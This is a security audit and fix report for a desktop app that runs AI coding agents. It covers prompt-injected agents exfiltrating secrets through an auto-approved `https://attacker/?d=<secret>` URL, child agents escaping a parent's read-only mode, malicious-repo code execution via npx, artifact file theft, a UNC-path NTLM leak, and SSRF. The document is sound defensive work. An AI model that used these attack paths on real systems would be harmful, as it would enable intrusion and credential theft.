## Phase 1 — Security (blocks release)

### S1 — `open_in_browser` auto-approved for any URL
- Where: `src-tauri/src/chat_mcp.rs` ~376-383 (tool handler), `auto_allow` ~425; default `openAutoAllow: true` in `src/agents/agentToolsSettings.ts` ~36.
- Problem: a prompt-injected agent can open `https://attacker/?d=<secret>` (exfiltration) or GET local admin endpoints with no user prompt.
- Fix: auto-allow only when target is localhost/loopback or a file inside the chat cwd; external hosts → normal permission prompt. Also check `_meta.claudeCode.mcpServer.source` in `auto_allow` instead of trusting the tool name only.

### S2 — Delegated child doesn't inherit parent restrictions
- Where: `src-tauri/src/chat/delegate.rs` ~563-567 (`start_child`).
- Problem: only cwd/shell/tools/profile copied. A parent in plan/read-only mode can delegate to a child that can edit files; cross-agent children run under default profile.
- Fix: propagate the parent's permission mode to the child (map to the closest mode of the child agent, or the most restrictive one if no mapping exists).

### S3 — Cancelled delegated task keeps running
- Where: `src-tauri/src/chat/delegate.rs` ~626-645 (`cancel_task`), `finished_to_close` ~323, `KEEP_FINISHED=3`.
- Problem: only `session/cancel` sent; a child ignoring it keeps running tools until the parent closes.
- Fix: after cancel, `close_child` immediately (or after a short grace period, e.g. 3 s).

### S4 ✓ — `npx` fallback runs inside the untrusted project folder
- Where: `src-tauri/src/chat.rs` ~304-311 (`launch_command`), spawn ~1924-1973 (Windows `cmd /C npx`, WSL `exec npx` in `wsl_script`).
- Problem: when the managed adapter isn't installed yet, `npx -y @agentclientprotocol/*-acp` runs with cwd = project → project `.npmrc` (`registry=`) or `node_modules/.bin/<name>` → code execution when opening a chat in a malicious repo.
- Fix: run the npx fallback with a neutral `current_dir` (app data dir or temp), passing the project dir to the adapter only through ACP `session/new` cwd (already the case). Check WSL path too.

### S5 ✓ — HTML artifacts can read and exfiltrate the folder
- Where: `src-tauri/src/preview.rs` `file_response` ~160 (`Access-Control-Allow-Origin: *` at ~166, no CSP), `resolve_preview_file` ~205; `src/browser/browserSettings.ts` ~30 (`artifactScripts` default `true`).
- Problem: an `.html` written by a malicious repo / injected agent, opened in the panel, runs JS that can fetch any file in its folder (dotfiles included) via `/f/<token>/...` and send it anywhere.
- Fix: send a CSP with artifact responses (`connect-src 'self'; img-src 'self' data: blob:; ...`), drop `ACAO:*` unless needed, refuse dotfile/dot-dir segments in `resolve_preview_file`. Consider defaulting `artifactScripts` to off (ask user — leave default as is if unsure, and mention in final report).

### S6 ✓ — Phone paths reach `canonicalize` without local-path check (UNC → NTLM leak)
- Where: `src-tauri/src/remote/fsbrowse.rs` ~22-37 (`confine`), `src-tauri/src/remote/mod.rs` ~2235 (`new_target_ok`, used by `NewTab`/`NewChat`).
- Problem: `\\attacker\share` triggers an SMB connection from the desktop (NTLMv2 hash). `explorer::resolve` and `chat_images::read_file` already guard this.
- Fix: call `crate::fs::is_local_path(p, false) && crate::fs::links_stay_local(p)` before any fs access in both places.

### S7 — Blind SSRF in `preview_frame_check`
- Where: `src-tauri/src/preview.rs` ~101; triggered from `routeAgentOpen` (`src/browser/agentOpen.ts`).
- Problem: GET with up to 5 redirects to any URL incl. RFC1918 / cloud metadata.
- Fix: for non-local URLs reuse `link_preview`'s `PublicOnly` resolver; for local hosts skip the check.

### S8 — API keys in plaintext and in every child env
- Where: `src-tauri/src/provider_auth_keys.rs` ~44-104 (`.flowcode-auth.json`, `write_private` sets no ACL on Windows), `src-tauri/src/profiles.rs` ~178 (`env_for`).
- Problem: key injected into env of every PTY / chat / status command of the profile → any shell command an agent runs can read it. Codex also has a second copy in `auth.json`.
- Fix (now): inject the key only into the spawn of the provider CLI / ACP adapter itself, not into generic PTY shells. Fix (later, note only): OS keyring / DPAPI storage.

### S9 — Adapter npm install with scripts, from `latest`
- Where: `src-tauri/src/acp_adapters.rs` ~155 (`install`), WSL script ~260.
- Fix: add `--ignore-scripts` (verify the adapters still work without postinstall — check their package.json in the installed dir). Pinning versions: note as follow-up.

### S10 — MCP IPC dir permissions and unbounded reads
- Where: `src-tauri/src/chat_mcp.rs` ~128-130 (dir creation), ~245-258 (`take_requests`).
- Fix: on Unix `chmod 0700` after `create_dir_all`; cap request file size (1 MB) before `read_to_string`.

### Low priority (note only, don't implement unless trivial)
- Updater: signature over `SHA256SUMS` not bound to version; "newer" decided from unsigned `tag_name` (`updater.rs` ~215, ~330) → downgrade possible with GitHub account control. Fix: version inside signed manifest.
- `system.rs` ~188 `DENIED_OPEN_EXT` incomplete (`rdp`, `theme`, `themepack`, `msh*`, `psc1`, `slk`, `docm/xlsm/pptm`, `html`, `svg`) → switch to allowlist.
- `chat.rs` ~1780 `image_file` and `remote/mod.rs` ~2087 `ChatImage`: image path not confined to chat cwd.
- MCP per-chat token readable via `/proc/<pid>/environ` in WSL/Linux → child can call tools with parent depth (`chat_mcp.rs` ~87-100, ~219-225).
- Phone `input` op in provider auth writes raw bytes into Gemini REPL PTY (`provider_auth.rs` ~463-499): restrict to one line, no control chars.
- Trust model: a paired phone = full RCE (PTY input, whole-disk explorer). Future feature: per-device "view only" role.

## Phase 2 — Bugs

### Backend

**B1 ✓ — Agents and shells survive app exit**
- Where: `src-tauri/src/lib.rs` ~294 (`.run(generate_context!())`, no `RunEvent` handler); cleanup only in window `Destroyed` handler on detached threads (`chat.rs` ~1859-1873, `pty/mod.rs` ~654-663); `updater.rs` ~579 `app.exit(0)`.
- Fix: `.build(ctx)?.run(|app, ev| ...)` and on `RunEvent::Exit` kill all chats and PTYs synchronously. On Windows also assign children to a Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`. (Sonnet-level task.)

**B2 — WSL chat close leaves Linux processes alive**
- Where: `chat.rs` ~1899-1912 (spawn), ~1537-1548 (`kill_tree`).
- Problem: `taskkill /T` kills only `wsl.exe`; bash → node adapter and tool subprocesses continue.
- Fix: WSL script uses `setsid` and prints its pgid (or `$$`) on stderr/first line; `kill_tree` runs `wsl.exe -d <distro> -e kill -TERM -- -<pgid>` before taskkill.

**B3 ✓ — Diagnostic error unlocks composer mid-turn**
- Where: `chat.rs` ~157 (`next_status`: any `ChatBody::Error` → Idle), ~1571 (oversized-line handler emits `ChatBody::Error`).
- Fix: emit the oversized-line diagnostic as a non-terminal event (e.g. `Ext` or a dedicated warning) so status doesn't change. Check `delegate.rs` ~736 consistency.

**B4 — Browser login reported successful too early**
- Where: `src-tauri/src/provider_auth.rs` ~469-478, `plugins.rs` ~166-177 (`cli_is_logged_in`).
- Problem: completion = "credential stamp changed" + `cli_is_logged_in` run with `profiles::env_for` which injects the saved API key → reports logged-in; `.claude.json` is rewritten by any running Claude session; re-auth with old creds counts too. Result: login PTY killed before OAuth finishes.
- Fix: check with `browser_env` (keys stripped) and require a NEW `.credentials.json` mtime (or clean CLI exit), not any stamp change.

**B5 — provider_auth leaks / races**
- Where: `provider_auth.rs` ~363-372, ~386-390 (child left running if `send_rpc(initialize)` / `try_clone_reader` / `take_writer` fails); ~338-341, ~430-437 (busy checks for key vs browser not atomic across `SESSIONS` and `KEY_OPS`).
- Fix: kill guard on error paths; single mutex (or one map keyed by `(cli, profile)`) for both ops.

**B6 — acp_adapters install robustness**
- Where: `acp_adapters.rs` ~193-222 (`run_with_timeout`: `child.kill()` only, no wait, no tree kill → real npm keeps writing while `remove_dir_all(tmp)` runs), ~97 (`checked` written before install → failed install not retried for 12 h), ~126-139 (deletes all versions but latest two, even if in use by a live chat).
- Fix: use `kill_tree` + `wait()`; write `checked` only on success (or a shorter retry on failure); keep versions referenced by live chats (or delete only versions older than N days).

**B7 — `is_auth_error` too broad**
- Where: `chat.rs` ~285-288. Every JSON-RPC `-32000` treated as auth.
- Fix: require auth keywords in message (or adapter-specific code).

**B8 — Delegate result includes the whole turn text**
- Where: `chat.rs` `accumulate_answer` ~871-885.
- Fix: reset buffer when a tool_call starts; keep only text after the last tool call.

**B9 — Window-destroyed races**
- `watcher.rs` ~117-122: after inserting the watcher, check `app.get_webview_window(label)` and remove if gone (same pattern as `chat_start`/`pty_spawn`).
- `dictation/mod.rs` ~216-222: store session before spawning the worker, or re-check window after `ready_rx` and stop.

**B10 — Unix `end_pty_agent` group kill may silently fail**
- Where: `agents/mod.rs` ~206, `chat.rs` ~1553 (`kill -KILL -- -pid` requires group leader).
- Fix: fall back to killing the pid and its descendants (sysinfo) when the group kill fails.

**B11 — `setup()` caches a failed init forever**
- Where: `chat_mcp.rs` ~124-141 (`OnceLock` stores `None`).
- Fix: don't cache failure; log and retry on next call.

## Implementation outcome

The actionable security, backend, mobile, desktop, and cleanup items have been implemented. The MCP server remains enabled. No `tauri dev` instance was launched or restarted.

### Security

- **S1:** Automatic ACP approval is limited to loopback URLs and files inside the chat folder. Claude calls also require the dynamic Flowcode server metadata. The desktop asks before any direct external URL opens, including adapters that skip ACP permission requests. No network request starts before that confirmation.
- **S2:** A child receives the parent's current permission mode before its prompt. Cross-provider delegation selects a read-only or planning mode; delegation fails if no safe mapping exists.
- **S3:** Cancelling a delegated task closes its session and stops its processes immediately.
- **S4:** The `npx` fallback runs in a managed neutral folder on the host and in WSL. Package specifications are pinned and lifecycle scripts are disabled.
- **S5:** Artifact responses carry a resource CSP scoped to their registered root. A separate artifact host policy also blocks external frame navigation. Dotfiles and dot-directories are refused, including in phone previews. CORS remains enabled because opaque sandbox origins need it for sibling resources and ES modules. Artifact scripts retain their existing default, but cannot load external resources. CDN-dependent artifacts need local dependencies.
- **S6:** Phone filesystem paths, roots, and links are checked before filesystem access. Preview paths receive the same local-link checks.
- **S7:** External frame checks use the existing public-address resolver, including redirect targets. Loopback checks make no HTTP request.
- **S8:** General PTY shells receive profile directories but no stored API keys. Provider-specific adapter/status processes receive only their own provider's key. Terminal launch shims read the credential record in a dedicated provider-launch process, preserving normal CLI launches without exposing the stored key in the parent shell or command text.
- **S9:** Adapter installs disable lifecycle scripts and pin Claude ACP 0.101.0 and Codex ACP 2.5.0. Installed dependency manifests contain no required install hooks. Published version directories are immutable and retained rather than deleting files potentially used by running chats.
- **S10:** Unix MCP directories are private (0700). Request reads are bounded to 1 MiB, regular files only, and bounded batches.

Stored API keys and the native Codex auth file are still plaintext. A provider's own subprocesses can inherit its key. OS keyring/DPAPI storage and isolation against other processes belonging to the same OS user remain separate follow-ups; these changes do not claim that stronger boundary.

### Backend bugs

- **B1/B2:** App exit synchronously stops all chat, PTY, and provider-login sessions, including phone-owned logins. Windows children are assigned to a kill-on-close Job Object. WSL adapters run in a new Linux process group; closure kills that group, including when its startup marker arrives after cancellation.
- **B3:** Oversized-message warnings are non-terminal extension events and no longer make a running chat idle.
- **B4/B5:** Browser authentication is checked without API keys. Claude/Codex require a clean login-command exit; Gemini requires new OAuth credentials. Error paths own kill guards, and browser/key reservations share an atomic gate.
- **B6:** Adapter timeouts kill and reap the complete command tree. Windows commands use a dedicated Job Object. Output and pipe-drain waits are bounded. Failed installs are not cached as successful checks; existing version directories are not replaced or pruned.
- **B7:** Generic JSON-RPC -32000 errors are no longer sufficient to classify a failure as authentication-related.
- **B8:** Delegation prefers text after the final tool launch, with the full turn retained as a fallback when no final message exists. Both buffers have strict UTF-8-safe byte limits. This avoids the report's proposed unconditional reset losing useful results.
- **B9/B10/B11:** Watcher/dictation adoption handles owner-window destruction; dictation cleanup cannot stop a replacement worker. Unix tree killing falls back to individual descendants when no process group exists. Failed MCP initialization is retried.

### Mobile and desktop

- **M1/M2:** Markdown labels produce one actionable link, including nested formatting. Known command prefixes do not become part of file targets; ordinary filenames containing spaces remain supported.
- **M3/M4/M5:** FolderPicker has a shared show-hidden toggle. Subagent tags show live/done/failed state. Computer location persists distinctly from home. Agent menus track visual-viewport movement and have a visible fallback. Implicit hostnames are not offered as local file links.
- **F1:** Resize handles use pointer capture and terminate on capture loss; pending animation frames and capture are released during cleanup. The original intermittent browser interaction issue still needs manual reproduction before attributing it to this cause.
- **F2:** Browser and host load/loaded messages carry sequence IDs. Removed frames, obsolete async responses, and obsolete timeouts cannot finish the current load.
- **F3:** Startup polling timers are cleared immediately during terminal cleanup. The original report overstated this issue: the old timers already stopped on their next callback.

### Optimizations and report corrections

- **P1/P2:** Timeline segments and unchanged subagent objects retain identity; transcript rendering is memoized separately from composer edits. Existing ToolGroup/SubagentCards comparators already helped before these fixes, so the original claim that memoization never worked was too broad. Virtualization and `content-visibility` remain profiling-led follow-ups: adding wrappers or estimated heights without measurements would risk compaction styling and scroll position.
- **P3:** Existing 5-second path cache and concurrent-request deduplication remain. Uncached path checks wait 275 ms. Results are tied to their path/cwd, preventing stale clickable targets. The original claim of one IPC for every token was inaccurate.
- **P4/P5/P7:** Filesystem work runs outside the process-table mutex. Startup replay retains log/feed events without redundant desktop emissions. JSON-RPC parameters are moved out of parsed messages instead of cloned; log/feed ownership still requires some event copies.
- **P6:** PTY output is coalesced for up to 4 ms or approximately 32 KiB (at most one additional 8 KiB read). Queues remain bounded and output/exit ordering is preserved. Sending remains under the sink lock to preserve attach/detach ordering.
- **P8:** MCP polling backs off while idle. Authentication uses one shared reaper. Delegation retains at most 100 retired task records per parent in addition to its recent children. Temporary attachments have 32 MiB individual and 256 MiB aggregate limits, with a startup sweep of files older than three days.
- **P9:** Unused exports were made private, preserving functions used inside their module. The unused legacy mobile TerminalsScreen and its private helpers were removed. Knip includes phone/SDK entrypoints and the JavaScript files included from Rust, preventing false positives.

### Additional hardening and explicit follow-ups

- Release signatures now bind a canonical version header inside SHA256SUMS. The signer adds/verifies the header and uploads the manifest before its signature. Older clients can still parse the checksum lines and verify the raw signature. New clients reject missing, mismatched, or replayed version headers. No release was signed or published during this work.
- OS default-app opening uses an allowlist of reviewed document/media/source extensions; active HTML/SVG artifacts use the internal preview instead. Image paths associated with a chat must remain inside its root, including after resolving links.
- Provider-auth input rejects multiline paste and control characters in OAuth callbacks. Individual navigation keys required by the existing interactive login UI remain supported.
- Per-device view-only permissions, encrypted credential storage, and OS-level protection of parent MCP tokens are architectural follow-ups, originally marked as future/note-only work. A paired phone still has the deliberately granted terminal/explorer capabilities.
- Unix/WSL runtime behavior, touch interaction, and actual provider OAuth flows require the manual checks below. Windows compilation and unit tests cannot prove those interactions.
